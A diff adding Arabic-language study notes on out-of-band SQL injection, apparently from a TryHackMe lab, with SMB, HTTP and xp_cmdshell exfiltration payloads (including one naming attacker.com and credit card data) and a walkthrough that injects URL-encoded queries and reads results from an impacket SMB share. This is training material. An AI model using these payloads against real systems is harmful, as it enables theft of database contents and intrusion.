@@ -464,7 +464,211 @@ $username = str_replace($special_chars, '', $username);
 
 
 <details>
-  <summary>Introduction</summary>
+  <summary>Out-of-band SQL Injection</summary>
+
+<details>
+  <summary>GPT--explain</summary>
+
+## 🎯 يعني إيه OOB SQL Injection؟
+
+الـ SQL Injection العادي (In-band) هو لما تبعت كود خبيث في الـ input (زي حقل بحث أو login)، والنتيجة بترجعلك في نفس الصفحة. لكن في بعض الحالات، السيرفر بيمنع الرد المباشر أو بيكون فيه جدار ناري (Firewall) أو IDS بيوقف أي رد غير طبيعي.
+
+⬅️ هنا بييجي دور **Out-of-Band SQLi (OOB SQLi)**:
+هو ببساطة إنك تبعت الكود الخبيث، والبيانات ترجعلك من طريق مختلف (زي DNS أو HTTP أو SMB).
+
+---
+
+## ⚙️ إزاي بيشتغل OOB SQL Injection؟
+
+أنت بتقول لقاعدة البيانات: "مش لازم ترد عليا هنا… ابعتي البيانات دي على عنوان تاني أنا بتحكم فيه."
+
+---
+
+## ✅ ليه نستخدم OOB؟
+
+* لما السيرفر ما بيرجعش أي بيانات مباشرة أو الرد متشفر.
+* لما فيه WAF/IDS بيراقب ويمنع استجابات غير طبيعية.
+* لما السيرفر ورا جدار ناري ومفيش اتصال مباشر بينك وبينه.
+
+---
+
+## 💡 أشهر الطرق المستخدمة حسب نوع قاعدة البيانات:
+
+### 🔸 MySQL / MariaDB:
+
+```sql
+SELECT secret_data FROM users 
+INTO OUTFILE '\\\\ATTACKBOX_IP\\logs\\out.txt';
+```
+
+* يكتب النتيجة في ملف على السيرفر.
+* يمكن الكتابة على SMB Share خارجي.
+
+### 🔸 MSSQL:
+
+```sql
+EXEC xp_cmdshell 'bcp "SELECT credit_card FROM users" queryout "\\\\10.10.58.187\\logs\\cards.txt" -c -T';
+```
+
+* يستخدم أوامر النظام عبر xp\_cmdshell.
+
+### 🔸 Oracle:
+
+```sql
+BEGIN
+  UTL_HTTP.BEGIN_REQUEST('http://attacker.com?data=' || secret_data);
+END;
+```
+
+* يستخدم UTL\_HTTP أو UTL\_FILE لإرسال البيانات.
+
+---
+
+## 🔍 طرق النقل المختلفة:
+
+1. **SMB Exfiltration**
+
+   * السيرفر يكتب ملف على SMB Share بتاعك.
+
+2. **HTTP Requests**
+
+   * لو قاعدة البيانات تدعم إرسال HTTP (زي Oracle).
+
+3. **DNS Exfiltration**
+
+   * ترسل البيانات مشفرة كـ DNS query. يتطلب DNS Server خاص بيك.
+
+---
+
+## 🧪 سيناريو عملي من TryHackMe (مثال SMB OOB):
+
+### 🧱 الوضع:
+
+رابط فيه SQLi:
+
+```
+http://MACHINE_IP/oob/search_visitor.php?visitor_name=Tim
+```
+
+الكود في الخلفية:
+
+```php
+$sql = "SELECT * FROM visitor WHERE name = '$visitor_name'";
+```
+
+### 🎯 الهدف:
+
+نخرج بيانات قاعدة البيانات (زي إصدارها) باستخدام SMB.
+
+### 🚀 الخطوات:
+
+1. **شغل SMB Server على AttackBox**
+
+```bash
+cd /opt/impacket/examples
+python3.9 smbserver.py -smb2support logs /tmp
+```
+
+2. **جهّز البايلود:**
+
+```sql
+1'; SELECT @@version INTO OUTFILE '\\\\ATTACKBOX_IP\\logs\\out.txt'; --
+```
+> ``ATTACKBOX_IP`` is tun0 IP
+
+
+
+3. **ملاحظة مهمة:**
+   في MySQL فيه متغير `secure_file_priv`:
+
+* لو متعيّن على فولدر → مش هتقدر تكتب غير فيه.
+* لو فاضي → تقدر تكتب في أي مكان.
+
+أماكن بديلة: `/var/lib/mysql-files/` أو `/tmp/`
+
+4. **عرض الملف على SMB:**
+
+```bash
+smbclient //ATTACKBOX_IP/logs -U guest -N
+ls
+```
+
+---
+
+## ✅ خلاصة:
+
+* OOB SQLi = تبعت كود خبيث والداتا ترجعلك من قناة تانية (DNS, HTTP, SMB).
+* مفيد لما يكون السيرفر مقفول أو فيه WAF.
+* لازم تجهز سيرفر خارجي تستقبل عليه البيانات.
+
+
+</details>
+
+
+- > first ``lcate`` **smbserver.py**
+  >
+  > ```
+  > locate smbserver.py
+  > ```
+  >
+  > ```
+  > /usr/lib/python3/dist-packages/impacket/smbserver.py
+  > /usr/lib/python3/dist-packages/scapy/layers/smbserver.py
+  > /usr/share/doc/python3-impacket/examples/smbserver.py
+  > ```
+  > after this lesten using this
+  >
+  > ```
+  > python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support -comment "My Logs Server" -debug logs /tmp
+  > ```
+  >
+  > and open
+  >
+  > ```
+  > http://10.10.118.35/oob/search_visitor.php?visitor_name=1%27;%20SELECT%20@@version%20INTO%20OUTFILE%20%27\\\\10.8.47.102\\logs\\out.txt%27;%20--
+  > ```
+  >
+  > now if we go to **``/tmp/``** will find
+  >
+  > ```
+  > 
+  > MozillaUpdateLock-6F44D7866C515FB4
+  > out.txt
+  > snap-private-tmp
+  > ssh-hANM0kFepfUI
+  > systemd-private-e6b60fac0cdb4058be212246d60424e0-apache2.service-y0ADPx
+  > systemd-private-e6b60fac0cdb4058be212246d60424e0-colord.service-U9islR
+  > systemd-private-e6b60fac0cdb4058be212246d60424e0-fwupd.service-FVxt1L
+  > ```
+  >
+  > ```
+  > cat out.txt
+  > ```
+  >
+  > ```
+  > 10.4.24-MariaDB
+  > ```
+  >
+  > done 😝
+  >
+  > now to know  @@basedir
+  >
+  > ```
+  > http://10.10.118.35/oob/search_visitor.php?visitor_name=1%27;%20SELECT%20@@basedir%20INTO%20OUTFILE%20%27\\\\10.8.47.102\\logs\\out1.txt%27;%20--
+  > ```
+  >
+  > if we open ``/tmp/`` will found ``out1.txt``
+  >
+  > ```
+  > cat out1.txt
+  > ```
+  >
+  > ```
+  > C:/xampp/mysql
+  > ```
+  > 
+
+
 </details>
 
 --------------------------------------------------------------------------------------------------------------------------------------------------
@@ -472,7 +676,13 @@ $username = str_replace($special_chars, '', $username);
 
 
 <details>
-  <summary>Introduction</summary>
+  <summary>Other Techniques</summary>
+
+<details>
+   <summary>GPT--explain</summary>
+  
+</details>
+
 </details>
 
 --------------------------------------------------------------------------------------------------------------------------------------------------
